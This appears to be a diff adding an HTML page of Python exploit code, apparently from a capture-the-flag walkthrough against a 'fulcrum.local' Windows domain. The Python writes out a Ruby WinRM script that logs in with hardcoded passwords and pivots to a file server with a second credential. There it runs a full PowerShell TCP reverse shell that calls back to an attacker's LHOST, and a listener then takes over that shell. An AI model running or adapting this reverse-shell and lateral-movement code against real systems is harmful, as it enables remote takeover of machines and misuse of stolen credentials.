@@ -1,0 +1,27 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Implementation in python</title>
+</head><body>ruby_helper = """require 'winrm'<br/>
+conn = WinRM::Connection.new( <br/>
+&nbsp; endpoint: 'https://"""+str(RHOST)+":"+str(WINRM_RDPORT)+"""/wsman',<br/>
+&nbsp; transport: :ssl,<br/>
+&nbsp; user: 'WebUser',<br/>
+&nbsp; password: 'M4ng£m£ntPa55',<br/>
+&nbsp; :no_ssl_peer_verification =&gt; true<br/>
+)<br/>
+conn.shell(:powershell) do |shell|<br/>
+&nbsp; output = shell.run("$pass = convertto-securestring -AsPlainText -Force -String '@fulcrum_bf392748ef4e_$'; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist 'fulcrum.local\\\\923a',$pass; Invoke-Command -ComputerName file.fulcrum.local -Credential $cred -Port 5985 -ScriptBlock {$client = New-Object System.Net.Sockets.TCPClient('"""+str(LHOST)+"',"+str(LPORT2)+"""); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); try { $sendback = (iex $data | Out-String ); } catch { $sendback = ($_.Exception|out-string) }; $sendback2 = $sendback + 'PS ' + $(whoami) + '@' + $env:computername + ' ' + $((gi $pwd).Name) + '&gt; '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close(); }") do |stdout, stderr|<br/>
+&nbsp; &nbsp; STDOUT.print stdout<br/>
+&nbsp; &nbsp; STDERR.print stderr<br/>
+&nbsp; end<br/>
+&nbsp; puts "The script exited with exit code #{output.exitcode}"<br/>
+end<br/>
+"""<br/>
+<br/>
+with open("ruby_helper.rb", "wb") as f:<br/>
+&nbsp; &nbsp; f.write(ruby_helper)<br/>
+<br/>
+pssh = listen(LPORT2, timeout=TIMEOUT).wait_for_connection()<br/>
+pssh.interactive()</body></html>
